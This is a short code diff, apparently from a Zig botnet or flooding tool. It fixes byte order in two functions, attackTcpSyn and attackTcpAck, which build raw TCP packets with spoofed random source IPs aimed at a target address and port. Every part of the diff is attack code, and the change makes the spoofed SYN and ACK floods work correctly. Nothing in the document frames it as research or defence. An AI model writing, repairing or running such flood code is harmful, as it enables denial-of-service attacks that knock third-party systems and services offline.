@@ -99,8 +99,8 @@ pub fn attackTcpSyn(ip: u32, port: u16, duration: u32) void {
         iph.ttl = 64;
         iph.protocol = IPPROTO_TCP;
         iph.check = 0;
-        iph.saddr = rng.next(); // Random source IP (spoofed)
-        iph.daddr = ip;
+        iph.saddr = std.mem.nativeToBig(u32, rng.next()); // Random source IP (spoofed)
+        iph.daddr = std.mem.nativeToBig(u32, ip);
 
         // Build TCP header
         const tcph = @as(*TcpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
@@ -155,8 +155,8 @@ pub fn attackTcpAck(ip: u32, port: u16, duration: u32) void {
         iph.ttl = 64;
         iph.protocol = IPPROTO_TCP;
         iph.check = 0;
-        iph.saddr = rng.next();
-        iph.daddr = ip;
+        iph.saddr = std.mem.nativeToBig(u32, rng.next());
+        iph.daddr = std.mem.nativeToBig(u32, ip);
 
         const tcph = @as(*TcpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
         tcph.source = std.mem.nativeToBig(u16, @as(u16, @truncate(rng.next() | 1024)));
